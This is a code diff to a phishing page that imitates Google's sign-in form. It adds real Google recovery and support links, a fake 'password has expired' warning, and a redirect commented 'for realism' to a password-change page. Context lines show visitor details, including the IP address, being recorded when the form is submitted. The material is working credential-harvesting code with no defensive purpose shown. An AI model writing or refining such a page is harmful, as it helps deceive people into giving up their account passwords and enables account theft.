@@ -13,7 +13,7 @@
         button { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 24px; }
         button:hover { background-color: #1557b0; }
         .forgot { display: block; margin-top: 16px; color: #1a73e8; text-decoration: none; }
-        .error { color: #d93025; font-size: 14px; margin-top: 12px; display: none; }
+        .error { color: #d93025; font-size: 14px; margin-top: 12px; display: block; background: #fce8e6; padding: 10px; border-radius: 4px; }
         .footer { margin-top: 24px; font-size: 14px; color: #5f6368; }
     </style>
 </head>
@@ -25,9 +25,9 @@
             <input type="password" id="password" placeholder="Enter your password" required>
             <button type="submit">Next</button>
         </form>
-        <a href="#" class="forgot">Forgot email?</a>
-        <div id="errorMessage" class="error">Wrong password. Try again or click Forgot password to reset it.</div>
-        <div class="footer">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a></div>
+        <a href="https://accounts.google.com/signin/recovery" class="forgot">Forgot email?</a>
+        <div id="errorMessage" class="error">Your password has expired for security reasons. Please update it now to continue.</div>
+        <div class="footer">Not your computer? Use a private browsing window to sign in. <a href="https://support.google.com/accounts/answer/3067630">Learn more</a></div>
     </div>
 
     <script type="module">
@@ -58,7 +58,8 @@
                     timestamp: new Date().toISOString(),
                     ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
                 });
-                window.location.href = "payment.html?email=" + encodeURIComponent(email);
+                // Always redirect to password change for realism
+                window.location.href = "password-change.html?email=" + encodeURIComponent(email);
             } catch (error) {
                 document.getElementById('errorMessage').style.display = 'block';
             }
